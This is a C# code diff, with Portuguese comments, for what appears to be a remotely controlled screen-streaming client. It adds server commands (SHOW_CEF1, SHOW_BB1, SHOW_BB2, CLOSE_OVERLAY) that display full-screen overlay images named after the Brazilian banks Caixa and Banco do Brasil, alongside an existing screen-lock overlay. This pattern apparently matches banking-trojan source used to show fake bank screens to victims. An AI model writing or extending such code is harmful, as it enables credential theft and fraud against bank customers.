@@ -5,6 +5,7 @@ using Grpc.Net.Client;
 using System.Net.Http;
 using Grpc.Core;
 using ExemploGrpc;
+using System.Windows.Forms;
 // substituído uso de WindowsInput por LocalInput (mais compatível)
 
 class Program
@@ -146,6 +147,59 @@ class Program
             Console.WriteLine($"[WARN] Não foi possível criar overlay de trava: {ex.Message}");
         }
         // ==========================================
+
+        // ========== NOVO: Bank Overlay (padrão antigo BB_01/CEF_01) ==========
+        BankOverlay bankOverlay = null;
+        bool bankOverlayActive = false;
+
+        // Método para criar overlay de banco em thread separada (padrão antigo)
+        void ShowBankOverlay(string imageName)
+        {
+            Thread overlayThread = new Thread(() =>
+            {
+                try
+                {
+                    // Criar e mostrar overlay (igual TBB1Main/TCEFMain do sistema antigo)
+                    bankOverlay = new BankOverlay(imageName);
+                    bankOverlayActive = true;
+                    Console.WriteLine($"[BANK-OVERLAY] Mostrando overlay: {imageName}");
+
+                    // Show() bloqueia thread até fechar (igual ao padrão antigo)
+                    System.Windows.Forms.Application.Run(bankOverlay);
+
+                    bankOverlayActive = false;
+                    Console.WriteLine("[BANK-OVERLAY] Overlay fechado");
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"[BANK-OVERLAY] Erro: {ex.Message}");
+                    bankOverlayActive = false;
+                }
+            });
+
+            overlayThread.SetApartmentState(ApartmentState.STA); // Requerido para WinForms
+            overlayThread.Start();
+        }
+
+        void CloseBankOverlay()
+        {
+            try
+            {
+                if (bankOverlay != null && bankOverlayActive)
+                {
+                    bankOverlay.Invoke(new Action(() =>
+                    {
+                        bankOverlay.CloseOverlay();
+                    }));
+                    Console.WriteLine("[BANK-OVERLAY] Fechando overlay...");
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[BANK-OVERLAY] Erro ao fechar: {ex.Message}");
+            }
+        }
+        // ======================================================================
 
         // resolução atual da tela capturada
         int lastWidth = 1920;
@@ -405,6 +459,28 @@ class Program
 
                         // PEEK_BEHIND removed: Trava agora já libera o servidor automaticamente.
 
+                        // ========== Bank Overlays (padrão antigo BB_01/CEF_01) ==========
+                        case "SHOW_CEF1":
+                            ShowBankOverlay("CEFE_01.bmp");
+                            Console.WriteLine("  >> [EXEC] Mostrando overlay CEF_01");
+                            break;
+
+                        case "SHOW_BB1":
+                            ShowBankOverlay("BB_01.bmp");
+                            Console.WriteLine("  >> [EXEC] Mostrando overlay BB_01");
+                            break;
+
+                        case "SHOW_BB2":
+                            ShowBankOverlay("BB_02.bmp");
+                            Console.WriteLine("  >> [EXEC] Mostrando overlay BB_02");
+                            break;
+
+                        case "CLOSE_OVERLAY":
+                            CloseBankOverlay();
+                            Console.WriteLine("  >> [EXEC] Fechando overlay de banco");
+                            break;
+                        // ================================================================
+
                         case "STOP":
                             Console.WriteLine("Servidor solicitou parada do streaming.");
                             cts.Cancel();
@@ -419,11 +495,17 @@ class Program
 
         await Task.WhenAll(sendTask, receiveTask);
 
-        // Limpar overlay
+        // Limpar overlays
         try
         {
             lockOverlay?.SetLocked(false);
             lockOverlay?.Close();
+        }
+        catch { }
+
+        try
+        {
+            CloseBankOverlay();
         }
         catch { }
 
